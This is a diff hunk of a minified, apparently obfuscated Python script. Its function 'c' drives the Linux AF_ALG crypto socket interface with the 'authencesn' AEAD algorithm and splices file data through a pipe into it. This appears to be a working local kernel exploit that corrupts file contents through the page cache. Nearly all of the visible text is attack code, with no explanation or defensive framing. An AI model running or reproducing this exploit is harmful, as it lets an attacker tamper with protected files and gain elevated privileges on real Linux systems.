@@ -5,15 +5,15 @@ def n(fd_in, fd_out, length, offset_src=0):
   """Fallback for older Python without os.splice"""
   try:
       # Try native splice first (Python >= 3.10)
-      if hasattr(os, 'splice'):
-          return os.splice(fd_in, fd_out, length, offset_src=offset_src)
+      if hasattr(g, 'splice'):
+          return g.splice(fd_in, fd_out, length, offset_src=offset_src)
   except:
       pass
     
   # Fallback: read + write (zero-copy not possible)
-  data = os.read(fd_in, length)
+  data = g.read(fd_in, length)
   if data:
-      os.write(fd_out, data)
+      g.write(fd_out, data)
   return len(data)
 def c(f,t,c):
  a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n(f,w,o,offset_src=0);n(r,u.fileno(),o)
